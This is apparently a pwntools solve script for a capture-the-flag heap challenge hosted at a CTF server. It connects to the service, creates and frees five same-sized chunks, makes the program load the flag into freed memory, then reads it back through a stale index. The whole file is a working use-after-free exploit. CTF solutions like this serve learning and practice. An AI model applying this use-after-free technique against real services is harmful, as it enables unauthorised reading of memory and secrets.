from pwn import *

HOST, PORT = "ctf.m4.lu", 65185

def i2b(x): 
    return str(x).encode()

def menu_create(s, idx, size, data=b"A\n"):
    s.sendlineafter(b"> ", b"1")
    s.sendlineafter(b"Index: ", i2b(idx))
    s.sendlineafter(b"Size: ", i2b(size))
    s.sendafter(b"Content: ", data if data.endswith(b"\n") else data + b"\n")
    s.recvuntil(b"Success")

def menu_delete(s, idx):
    s.sendlineafter(b"> ", b"2")
    s.sendlineafter(b"Index: ", i2b(idx))
    s.recvuntil(b"Success")

def menu_view(s, idx):
    s.sendlineafter(b"> ", b"3")
    s.sendlineafter(b"Index: ", i2b(idx))
    return s.recvline_contains(b"Data: ", timeout=2) or s.recvline(timeout=2)

def menu_get_flag(s):
    s.sendlineafter(b"> ", b"4")
    s.recvuntil(b"Flag is loaded", timeout=2)

def main():
    s = remote(HOST, PORT)
    # s = process("./chall")
    SIZE = 112  # 0x70

    for idx, tag in [(1,b"A"),(2,b"B"),(3,b"C"),(4,b"D"),(5,b"E")]:
        menu_create(s, idx, SIZE, tag)

    menu_delete(s, 1)
    menu_delete(s, 2)
    menu_delete(s, 3)
    menu_delete(s, 4)
    menu_delete(s, 5)

    menu_get_flag(s)

    s.sendlineafter(b"> ", b"3")
    s.sendlineafter(b"Index: ", b"1")
    s.recvuntil(b"Data: ")
    flag = s.recvline().strip()
    print(b"FLAG:", flag)
    s.close()

if __name__ == "__main__":
    main()
